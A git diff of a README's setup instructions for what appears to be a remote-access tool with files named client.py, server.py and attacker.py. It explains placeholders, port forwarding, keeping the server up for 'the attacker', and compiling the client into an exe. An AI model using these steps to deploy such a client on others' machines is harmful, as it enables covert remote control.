@@ -6,9 +6,9 @@
 
 **Setup**
 - Replace "IP" with your public IP in client.py and attacker.py **dont replace in server.py**
-- Replace "CLIENTNUMBER" with any number that you havent used yet.
+- Replace "CLIENTNUMBER" in client.py with any number that you havent used yet.
   - always set a different CLIENTNUMBER to every new client you intend to use
-- Replace "PORT" with your port forwarded port, [Tutorial](https://www.youtube.com/watch?v=0F53xFGhT-c) on how to port forward
+- Replace "PORT" in server.py, client.py and attacker.py with your port forwarded port, [Tutorial](https://www.youtube.com/watch?v=0F53xFGhT-c) on how to port forward
 - Run server.py, it has to be always up or client wont be able to comunicate with the attacker
 - Make an exe file out of client.py after you change the IP and the PORT use in CMD: \
   1.⠀``` cd your client.py location ```\
